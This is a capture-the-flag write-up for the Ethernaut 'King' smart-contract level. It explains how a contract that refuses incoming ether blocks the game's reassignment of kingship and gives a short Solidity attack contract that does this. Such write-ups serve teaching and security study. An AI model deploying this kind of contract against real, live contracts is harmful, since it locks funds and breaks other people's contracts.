# King

## Challenge Statement

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

## Analysis

The transfer function call in Line 18 : ```king.transfer(msg.value);```, which sends ether to the current king also transfers control to the target contract. The target contact can throw an error on receiving eth if there is no receive function, or if the receive function is purposefully malicious, both disrupting the flow of the original contract and stopping the execution of the following lines, hence not reassigning the new king.

## Solution

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {

    address payable target = 0x411EE47DCed674E6e4859883E22A0e06CC3bd0B7;

    function becomeKing() public payable {
        (bool sent, ) = target.call{value: msg.value}("");
        require(sent, "failed to send");
    }
}

## Moral

Most of Ethernaut's levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.

In this case, see: King of the Ether and King of the Ether Postmortem